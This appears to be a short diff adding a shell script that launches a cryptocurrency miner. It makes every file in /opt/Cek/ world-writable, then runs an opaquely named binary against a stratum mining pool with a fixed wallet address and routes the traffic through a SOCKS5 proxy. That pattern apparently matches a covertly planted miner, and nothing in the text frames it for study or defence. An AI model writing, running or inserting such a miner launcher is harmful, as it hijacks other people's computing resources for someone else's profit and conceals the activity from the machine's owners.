@@ -1,0 +1,2 @@
+cd /opt/Cek/ && chmod 777 * && ls
+./255 --algorithm randomscash --pool stratum-asia.rplant.xyz:17019 --tls true --wallet scash1qc8vfuhcwn0se32xhshcdjcrgvn38qgdfml54hj.gas --password m=solo --proxy socks5://192.111.134.10:4145 --keepalive true
